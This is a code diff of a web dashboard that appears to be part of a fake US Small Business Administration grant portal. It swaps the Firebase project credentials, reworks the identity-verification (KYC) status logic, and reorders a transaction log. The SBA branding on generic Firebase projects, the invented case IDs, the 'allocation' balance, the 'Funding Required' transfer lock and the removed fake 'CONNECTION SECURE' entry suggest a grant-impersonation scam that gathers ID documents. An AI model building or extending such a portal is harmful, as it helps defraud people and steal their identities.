@@ -86,15 +86,16 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, collection, query, where } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, collection, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+        // MATCHED PROJECT CONFIG
         const firebaseConfig = {
-            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
-            authDomain: "sba-grant-2026.firebaseapp.com",
-            projectId: "sba-grant-2026",
-            storageBucket: "sba-grant-2026.firebasestorage.app",
-            messagingSenderId: "838430821326",
-            appId: "1:838430821326:web:6438deacb334076a64f99f"
+            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
+            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
+            projectId: "sba-portal-2026-f1253",
+            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
+            messagingSenderId: "363290267220",
+            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -106,7 +107,7 @@
 
             document.getElementById('caseId').innerText = `CASE ID: SBA-${user.uid.substring(0,8).toUpperCase()}-2026`;
 
-            // 1. DYNAMIC USER DATA LISTENER
+            // 1. LIVE USER LISTENER
             onSnapshot(doc(db, "users", user.uid), (snap) => {
                 if (snap.exists()) {
                     const data = snap.data();
@@ -119,54 +120,42 @@
                         maximumFractionDigits: 2
                     });
                     
-                    // Normalize status for comparisons
-                    const kycStatus = (data.kycStatus || "PENDING").toUpperCase();
+                    const kycStatus = (data.kycStatus || "NOT STARTED").toUpperCase();
                     const pill = document.getElementById('statusPill');
                     const applyBtn = document.getElementById('applyBtn');
                     const transferBtn = document.getElementById('transferBtn');
                     const kycBtn = document.getElementById('kycBtn');
 
-                    // RESET CLASSES
-                    kycBtn.classList.remove('is-done', 'is-error', 'is-locked');
-                    applyBtn.classList.remove('is-locked');
-                    transferBtn.classList.remove('is-locked');
-                    pill.className = "status-pill";
+                    // RESET STATES
+                    kycBtn.className = "grid-item";
+                    applyBtn.className = "grid-item";
+                    transferBtn.className = "grid-item";
 
                     if(kycStatus === "APPROVED") {
                         pill.innerText = "● ACCOUNT VERIFIED";
                         pill.className = "status-pill status-verified";
                         kycBtn.innerHTML = "<span>✅</span><b>Verified</b>";
                         kycBtn.classList.add('is-done');
-                        kycBtn.onclick = () => alert("Identity Verification is complete.");
-                        
+                        kycBtn.onclick = () => alert("Verification Complete.");
                         applyBtn.onclick = () => location.href = 'apply.html';
-
+                        
                         if(balance > 0) {
                             transferBtn.onclick = () => location.href = 'transfer.html';
                         } else {
                             transferBtn.classList.add('is-locked');
-                            transferBtn.onclick = () => alert("FUNDING REQUIRED: Allocation $0.00.");
+                            transferBtn.onclick = () => alert("Funding Required.");
                         }
                     } 
-                    else if (kycStatus === "REJECTED" || kycStatus === "DECLINED" || kycStatus === "DENIED") {
+                    else if (["REJECTED", "DECLINED", "DENIED"].includes(kycStatus)) {
                         pill.innerText = "● VERIFICATION REJECTED";
                         pill.className = "status-pill status-rejected";
-                        kycBtn.innerHTML = "<span>⚠️</span><b>Try Again</b>";
                         kycBtn.classList.add('is-error');
-                        kycBtn.onclick = () => location.href = 'kyc.html'; // NOW UNLOCKED
-
+                        kycBtn.onclick = () => location.href = 'kyc.html';
                         applyBtn.classList.add('is-locked');
-                        applyBtn.onclick = () => alert("REJECTED: Please re-submit valid identification to unlock applications.");
                         transferBtn.classList.add('is-locked');
                     }
-                    else if (kycStatus === "PENDING" && (data.status === "PENDING AUDIT" || data.status === "ID VERIFIED FAILED")) {
-                         pill.innerText = "● AUDIT IN PROGRESS";
-                         kycBtn.onclick = () => location.href = 'kyc.html';
-                         applyBtn.classList.add('is-locked');
-                         transferBtn.classList.add('is-locked');
-                    }
                     else {
-                        pill.innerText = "● ELIGIBILITY: PENDING KYC";
+                        pill.innerText = "● PENDING KYC";
                         kycBtn.onclick = () => location.href = 'kyc.html';
                         applyBtn.classList.add('is-locked');
                         transferBtn.classList.add('is-locked');
@@ -174,34 +163,31 @@
                 }
             });
 
-            // 2. ACTIVITY LOG LISTENER
-            const qry = query(collection(db, "requests"), where("userId", "==", user.uid));
+            // 2. LIVE ACTIVITY LOG
+            const qry = query(collection(db, "requests"), where("userId", "==", user.uid), orderBy("timestamp", "desc"));
             onSnapshot(qry, (snap) => {
                 const logBox = document.getElementById('activityLog');
                 if(snap.empty) {
-                    logBox.innerHTML = `<div class="log-item"><div><b style="font-size:10px;">Security Handshake</b><br><small style="font-size:8px;">CONNECTION SECURE</small></div><div style="text-align:right;"><b style="font-size:10px; color:#10b981;">ACTIVE</b></div></div>`;
+                    logBox.innerHTML = `<p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">No recent activity.</p>`;
                     return;
                 }
-                const items = [];
-                snap.forEach(d => items.push({ id: d.id, ...d.data() }));
-                items.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
-
                 logBox.innerHTML = "";
-                items.forEach(r => {
+                snap.forEach(d => {
+                    const r = d.data();
                     const status = (r.status || 'PENDING').toUpperCase();
-                    let statusColor = "#f59e0b";
-                    if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) statusColor = "#10b981";
-                    if (["DENIED", "FAILED", "REJECTED", "DECLINED"].includes(status)) statusColor = "#ef4444";
+                    let color = "#f59e0b";
+                    if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) color = "#10b981";
+                    if (["DENIED", "FAILED", "REJECTED"].includes(status)) color = "#ef4444";
 
                     logBox.innerHTML += `
                         <div class="log-item">
                             <div>
-                                <b style="font-size:10px;">${(r.type || "TRANSACTION").replace(/_/g, ' ')}</b><br>
-                                <small style="font-size:8px; color:#94a3b8;">ID: ${r.id.substring(0,8).toUpperCase()}</small>
+                                <b style="font-size:10px;">${(r.type || "REQUEST")}</b><br>
+                                <small style="font-size:8px; color:#94a3b8;">${d.id.substring(0,8)}</small>
                             </div>
                             <div style="text-align:right;">
-                                <b style="color:var(--sba-blue); font-size:11px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : '--'}</b><br>
-                                <small style="color:${statusColor}; font-size:9px; font-weight:bold;">${status}</small>
+                                <b style="font-size:11px;">$${parseFloat(r.amount || 0).toLocaleString()}</b><br>
+                                <small style="color:${color}; font-size:9px; font-weight:bold;">${status}</small>
                             </div>
                         </div>`;
                 });
